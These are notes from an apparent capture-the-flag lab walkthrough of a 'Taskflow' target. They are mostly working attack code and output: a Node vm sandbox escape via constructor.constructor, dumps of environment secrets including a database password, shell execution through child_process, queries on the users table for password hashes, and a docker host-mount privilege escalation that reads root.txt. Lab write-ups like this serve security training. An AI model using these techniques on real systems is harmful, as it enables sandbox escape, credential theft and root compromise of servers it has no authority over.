## commands used on Hack Samrter lab Taskflow on YouTube video walk through: https://youtu.be/d3sAbEzJoq8

```
/etc/hosts 10.1.146.18 taskflow.hsm gitea.taskflow.hsm
```

```
Available: user, tasks, now, getTask(id), updateTask(id, data), deleteTask(id), createTask(data), log(msg)
```

```
log('Hello ' + user.username)
log('You have ' + tasks.length + ' tasks')
```

```
log(Object.keys(globalThis).join(', '))
```
```
--- Logs ---
user, tasks, now, Date, Math, JSON, Array, Object, String, Number, Boolean, RegExp, Map, Set, parseInt, parseFloat, isNaN, isFinite, Promise, Error, TypeError, RangeError, updateTask, getTask, getComments, deleteTask, createTask, log, console
```
Node vm escape
```
const p = this.constructor.constructor('return process')()
log(JSON.stringify(p.env))

const fs = p.mainModule.require('fs')
log(fs.readFileSync('/flag.txt', 'utf8'))
```

✗ Error: Code generation from strings disallowed for this context

```
const p = now.constructor.constructor('return process')()
log(JSON.stringify(p.env))

for (const k of Object.keys(globalThis)) {
  try {
    const proc = globalThis[k].constructor.constructor('return process')()
    log(k + ' → ' + typeof proc + ' pid=' + proc.pid)
  } catch (e) {
    log(k + ' → ✗ ' + e.message)
  }
}
```
dump process
```
const p = user.constructor.constructor('return process')()
log(JSON.stringify(p.env))
```
```
--- Logs ---
{"DATABASE_URL":"postgresql://taskflow:Pgta5kfl0w_Pr0d!@db:5432/taskflow","NODE_VERSION":"20.20.1","HOSTNAME":"d045dd66d0b9","YARN_VERSION":"1.22.22","SHLVL":"1","HOME":"/home/sandbox","PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","SANDBOX_SECRET":"sandbox-shared-secret-change-in-production","PWD":"/app"}
```

--
```
const F = now.constructor.constructor
const P = F('return process')()
const out = []

try {
  const cp = P.mainModule.require('child_process')
  out.push(cp.execSync(
    'ls -la /;ls -la /home; true'
  ).toString())
} catch (e) {
  out.push('[cjs] ' + e.message)
  try {
    const fs = (await F('return import("node:fs")')()).default   // ESM host fallback
    out.push('[/] ' + fs.readdirSync('/').join(', '))
    out.push('[.] ' + fs.readdirSync('.').join(', '))
  } catch (e2) { out.push('[esm] ' + e2.message) }
}

log(out.join('\n'))
```

==/home/sandbox/.ssh/authorized_keys

```
const P = now.constructor.constructor('return process')()
log(P.mainModule.require('fs').readFileSync(P.mainModule.filename, 'utf8'))
```
```
✓ Success

--- Logs ---
const express = require('express')
const pool = require('./db')
const { execute } = require('./executor')

const app = express()
const PORT = process.env.PORT || 3001
const SANDBOX_SECRET = process.env.SANDBOX_SECRET
```

----
```
const P = now.constructor.constructor('return process')()
const pool = P.mainModule.require('./db')
const r = await pool.query(`
  SELECT table_name,
         string_agg(column_name, ', ' ORDER BY ordinal_position) AS columns
  FROM information_schema.columns
  WHERE table_schema = 'public'
  GROUP BY table_name
  ORDER BY table_name
`)
for (const row of r.rows) log(`${row.table_name}: ${row.columns}`)
```
```
✓ Success

--- Logs ---
automations: id, user_id, name, code, is_active, created_at
comments: id, task_id, user_id, content, created_at
images: id, user_id, filename, mimetype, size, created_at
pages: id, user_id, title, content, created_at
tasks: id, user_id, title, description, time_spent, status, priority, start_date, due_date, end_date, created_at, updated_at
users: id, username, password_hash, email, created_at, is_admin
```
==
```
const P = now.constructor.constructor('return process')()
const pool = P.mainModule.require('./db')

const r = await pool.query('SELECT * FROM users ORDER BY id LIMIT 50')
for (const row of r.rows) log('users: ' + JSON.stringify(row))
```
--
```
docker run --rm --user 0 --network none \
  -v /:/host:ro --entrypoint /bin/sh postgres:16-alpine \
  -c 'id; cat /host/root/root.txt'
```
